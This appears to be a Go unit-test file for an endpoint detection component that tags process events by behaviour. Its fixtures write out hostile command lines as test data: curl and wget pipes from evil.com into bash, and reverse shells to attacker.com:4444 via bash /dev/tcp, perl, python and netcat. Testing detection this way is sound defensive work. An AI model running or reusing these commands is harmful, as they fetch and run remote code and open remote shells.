package main

import (
	"testing"
	"time"
)

func TestToBehaviorSummary_RemoteCodeExecution(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantContains []string
	}{
		{
			name: "curl pipe bash - remote code execution",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/curl",
				CommandLine: "curl http://evil.com/script.sh | bash",
				User:        "root",
			},
			wantContains: []string{"remote_code_execution"},
		},
		{
			name: "wget pipe sh - remote code execution",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/wget",
				CommandLine: "wget http://evil.com/script.sh -O- | sh",
				User:        "www-data",
			},
			wantContains: []string{"remote_code_execution"},
		},
		{
			name: "curl with pipe - remote code execution",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/curl",
				CommandLine: "curl http://bad.com | python3",
				User:        "nobody",
			},
			wantContains: []string{"remote_code_execution"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.event.ToBehaviorSummary()
			t.Logf("Behavior embedding: %s", got)
			for _, want := range tt.wantContains {
				if !containsString(got, want) {
					t.Errorf("ToBehaviorSummary() = %v, want to contain %v", got, want)
				}
			}
		})
	}
}

func TestToBehaviorSummary_ReverseShell(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantContains []string
	}{
		{
			name: "bash reverse shell",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/bin/bash",
				CommandLine: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
				User:        "www-data",
			},
			wantContains: []string{"reverse_shell"},
		},
		{
			name: "perl reverse shell",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/perl",
				CommandLine: "perl -e 'use Socket;p=Socket::INET->new(Proto=>tcp,PeerAddr=>\"attacker.com:4444\")'",
				User:        "nobody",
			},
			wantContains: []string{"reverse_shell"},
		},
		{
			name: "python reverse shell",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/python3",
				CommandLine: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444))'",
				User:        "www-data",
			},
			wantContains: []string{"reverse_shell"},
		},
		{
			name: "nc reverse shell",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/nc",
				CommandLine: "nc -e /bin/sh attacker.com 4444",
				User:        "www-data",
			},
			wantContains: []string{"reverse_shell"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.event.ToBehaviorSummary()
			t.Logf("Behavior embedding: %s", got)
			for _, want := range tt.wantContains {
				if !containsString(got, want) {
					t.Errorf("ToBehaviorSummary() = %v, want to contain %v", got, want)
				}
			}
		})
	}
}

func TestToBehaviorSummary_EncodedCommand(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantContains []string
	}{
		{
			name: "base64 encoded command",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/bin/bash",
				CommandLine: "echo YWJjZGVm | base64 -d | bash",
				User:        "root",
			},
			wantContains: []string{"encoded_command"},
		},
		{
			name: "python encoded",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/python3",
				CommandLine: "python3 -c \"eval('aWJj'.encode('base64'))\"",
				User:        "root",
			},
			wantContains: []string{"encoded_command"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.event.ToBehaviorSummary()
			t.Logf("Behavior embedding: %s", got)
			for _, want := range tt.wantContains {
				if !containsString(got, want) {
					t.Errorf("ToBehaviorSummary() = %v, want to contain %v", got, want)
				}
			}
		})
	}
}

func TestToBehaviorSummary_TempDirectory(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantContains []string
	}{
		{
			name: "execution from /tmp",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/tmp/malware",
				CommandLine: "/tmp/malware -p",
				User:        "guest",
			},
			wantContains: []string{"temp_directory_execution"},
		},
		{
			name: "execution from /var/tmp",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/var/tmp/backdoor",
				CommandLine: "/var/tmp/backdoor",
				User:        "www-data",
			},
			wantContains: []string{"temp_directory_execution"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.event.ToBehaviorSummary()
			t.Logf("Behavior embedding: %s", got)
			for _, want := range tt.wantContains {
				if !containsString(got, want) {
					t.Errorf("ToBehaviorSummary() = %v, want to contain %v", got, want)
				}
			}
		})
	}
}

func TestToBehaviorSummary_Benign(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantContains []string
	}{
		{
			name: "ls command",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/bin/ls",
				CommandLine: "ls -la /home/user",
				User:        "user",
			},
			wantContains: []string{"event_type:execve", "image:ls"},
		},
		{
			name: "git pull",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/usr/bin/git",
				CommandLine: "git pull origin main",
				User:        "developer",
			},
			wantContains: []string{"event_type:execve", "image:git"},
		},
		{
			name: "cat file",
			event: Event{
				EventType:   "execve",
				ImagePath:   "/bin/cat",
				CommandLine: "cat /etc/passwd",
				User:        "root",
			},
			wantContains: []string{"event_type:execve", "image:cat"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.event.ToBehaviorSummary()
			t.Logf("Behavior embedding: %s", got)
			for _, want := range tt.wantContains {
				if !containsString(got, want) {
					t.Errorf("ToBehaviorSummary() = %v, want to contain %v", got, want)
				}
			}
		})
	}
}

func TestEvent_ToSearchText(t *testing.T) {
	event := Event{
		Timestamp:   time.Now(),
		HostName:    "testhost",
		EventType:   "execve",
		ProcessID:   1234,
		ParentPID:   1000,
		ImagePath:   "/usr/bin/curl",
		CommandLine: "curl http://example.com",
		User:        "root",
	}

	got := event.ToSearchText()

	if got == "" {
		t.Error("ToSearchText() returned empty string")
	}

	if !containsString(got, "execve") {
		t.Errorf("ToSearchText() = %v, want to contain execve", got)
	}
}

func containsString(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || findSubstring(s, substr))
}

func findSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
